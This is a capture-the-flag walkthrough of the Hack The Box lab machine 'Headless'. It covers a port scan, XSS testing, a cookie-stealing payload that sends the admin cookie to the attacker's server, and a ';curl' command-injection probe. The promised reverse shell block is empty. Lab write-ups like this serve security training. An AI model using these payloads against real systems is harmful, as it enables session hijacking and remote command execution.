# Headless
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/539cf778-31bc-4262-8da5-4bd3703218c7)


## Lessons Learned:
- Identifying XSS vulnerability.
- Steal admin cookie.
- 

## STEPS:
> PORT SCANNING

```
┌──(vreshco㉿bread-yolk)-[~]
└─$ nmap -p- -sV -sC 10.10.11.8 --min-rate 1000
Starting Nmap 7.92 ( https://nmap.org ) at 2024-03-25 00:10 PDT
Nmap scan report for 10.10.11.8
Host is up (0.021s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Mon, 25 Mar 2024 07:08:09 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.92%I=7%D=3/25%Time=6601238F%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x20
SF:Python/3\.11\.2\r\nDate:\x20Mon,\x2025\x20Mar\x202024\x2007:08:09\x20GM
SF:T\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:02799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Zfs;
SF:\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20
SF:lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20
SF:\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,
SF:\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Construction
SF:</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20body
SF:\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20
SF:'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20displ
SF:ay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-c
SF:ontent:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ali
SF:gn-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h
SF:eight:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x200,\
SF:x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYPE\x
SF:20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\
SF:x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20respons
SF:e</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version
SF:\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20
SF:code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20u
SF:nsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.08 seconds
```

1. Based from the nmap results, we identified that the machine runs a web application at port 5000 and opens ssh login.

> WEB APP

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/749cf208-f661-4e93-a089-5632c00b64c9)


2. Long story short, after scanning for other subdomains, endpoints, or directories, it resulting to none interesting endpoint.

```
Got 2 results:
- dashboard (inaccessible, probably need admin role).
- support.
```

3. Hence our interest is only at `/support` endpoint.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7b83bc32-6e57-4ea7-9785-ddb8c7da02e4)


4. What could be interesting is the **message** section.
5. And noticed at the previous nmap results, there's a cookie header named `is_admin` with a set cookie.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6c9ebcc0-5dd2-44cf-8836-77d3cc31b7d9)


6. This could be a hint that the initial exploitation is client-side.
7. Let's try with simple XSS payload to validate whether the **message** textbox is indeed vulnerable with XSS.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1a26b02f-6a76-4c16-a420-3a0074e6dddf)


8. Interesting, it detects `<script>` tag usage then, let's use HTML entities.

> RESULT of using <img src=x onerror=alert('1')>

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/09d37dd9-00dc-4215-9e16-90df99810102)


9. Seems we still got the warning.
10. Another interest to identify XSS vuln is to test the request header. The most common headers that is injectable with XSS are `referer` and `user-agent`.
11. But before testing that, let's try to test for the last time whether:

```
- It just gave us a warning message everytime it detects <script> tag usage or html entities,
and still execute the code but not alert.
- Or it really does block the execution of any XSS payload.
```

12. Let's try to manipulate the message with not URL encoded XSS payload, for the last check I drop the simple cookie stealing payload.

```js
<img src=err onerror=fetch('http://10.10.14.64:1337/'+document.cookie);>
```

13. Boot up a python server on port 1337 then send the request.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d4724e8f-244a-41ae-997e-331e65fb5123)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/13b00aad-4507-4445-bd41-6fbf1f45aedc)


14. We got the admin cookie! As you can see, the cookie value is different than ours, hence it's really is the admin.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/765b04d7-6daf-4c37-9e04-8e66f987339f)


15. Change the cookie value to the admin cookie then access `/dashboard` endpoint.

> It is accessible now.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3e2a4d4a-7f8d-4c6f-a787-328585792cf5)


16. Great! Now this is more interesting, this time user can't input anything, seems the dashboard is used to check whether the system is up and running at certain date.
17. Knowing this, it's clear the if there is a vuln related to this, shall be command execution.
18. We can try to identify the vuln using burpsuite by intercept the request for system check at certain date and executes curl to our local file.
19. For example I tried to create a random file named --> "test_file", then intercept the request using burpsuite and add this command:

```
;curl http://10.10.14.64:1337/test_file
```

20. If our python server shows the response of `200` which means the file is accessed then it's indeed vulnerable to command injection.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4b10d133-6de3-4406-9369-f2fa1111efd7)


> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/79353434-3dd7-4ff4-8513-40557e15401d)


21. Nice! It's indeed vulnerable to command injection, let's upload our bash reverse shell then.

> bash reverse shell

```txt

```




 
